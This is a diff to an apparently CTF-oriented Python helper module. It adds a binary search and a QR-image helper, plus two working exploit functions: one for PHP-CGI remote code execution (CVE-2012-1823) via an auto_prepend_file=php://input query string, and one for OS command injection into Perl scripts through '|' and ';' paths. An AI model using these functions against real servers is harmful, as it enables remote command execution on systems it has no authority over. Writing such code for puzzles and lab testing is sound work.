@@ -1,8 +1,9 @@
 from functools import reduce
-import binascii
+import requests
 import numpy as np
-import math
-import time
+from PIL import Image
+import re
+
 
 
 def ext_gcd(a, b):
@@ -118,25 +119,56 @@ def dp(ary, limit, _index=0, _values=None, _stats=None):
     return _values[limit][_index], _stats
 
 
+def exploit_php_cve20121823(url, payload):
+    """
+    https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html
+    :param url:
+    :param payload:
+    :return:
+    """
+    exploit = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
+    res = requests.post(url+exploit, payload)
+    return res
+
+
+def binary_search(start_index, end_index, y, func=lambda x: x ** 101):
+    mid = (end_index - start_index) // 2 + start_index
+    while func(mid) != y:
+        if func(mid) > y:
+            end_index = mid
+        elif func(mid) < y:
+            start_index = mid
+        mid = (end_index - start_index) // 2 + start_index
+    return mid
+
+
+def generate_qr_code(ary, width, height):
+    """
+
+    :param ary: [[R, G, B], [R, G, B], [R, G, B]...]
+    :param width:
+    :param height:
+    :return: show QR code image
+    """
+    nd_ary = np.reshape(ary, (width, height, 3)).astype(np.uint8)
+    Image.fromarray(nd_ary).show()
+
+
+def exploit_perl_direct_os_command(url, payload="exploit_perl_direct_os_command"):
+    if payload == "exploit_perl_direct_os_command":
+        res1 = requests.get(url + "/echo " + payload + "|")
+        res2 = requests.get(url + "/;echo " + payload + "|")
+        if payload in res1.text:
+            print("exploit1 succeeded")
+        if payload in res2.text:
+            print("exploit2 succeeded")
+    # requests.get(url + "/;" + payload + "|")
+    return requests.get(url + "/" + payload + "|")
+
+
 def main():
-    Q = [
-        [440, 84], [61, 55], [149, 37], [959, 28], [363, 8],
-        [30, 13], [758, 18], [794, 6], [110, 86], [498, 61],
-        [327, 80], [162, 42], [232, 71], [573, 50], [115, 92],
-        [239, 74], [238, 59], [236, 97], [626, 76], [656, 39],
-        [318, 78], [772, 57], [877, 7], [141, 83], [52, 75],
-        [239, 74], [238, 59], [236, 97], [626, 76], [656, 39],
-        [318, 78], [772, 57], [877, 7], [141, 83], [52, 75],
-        [239, 74], [238, 59], [236, 97], [626, 76], [656, 39],
-        [318, 78], [772, 57], [877, 7], [141, 83], [52, 75],
-        [468, 93], [674, 54], [678, 34], [332, 14], [602, 61]
-    ]
-    size = 10000
-    maxvalue, flags = dp(Q, size)
-    selected = [Q[i] for i in range(len(flags)) if flags[i]]
-    print("max=%d select=%s" % (maxvalue, selected))
     pass
 
 
-if __name__  == "__main__":
+if __name__ == "__main__":
     main()
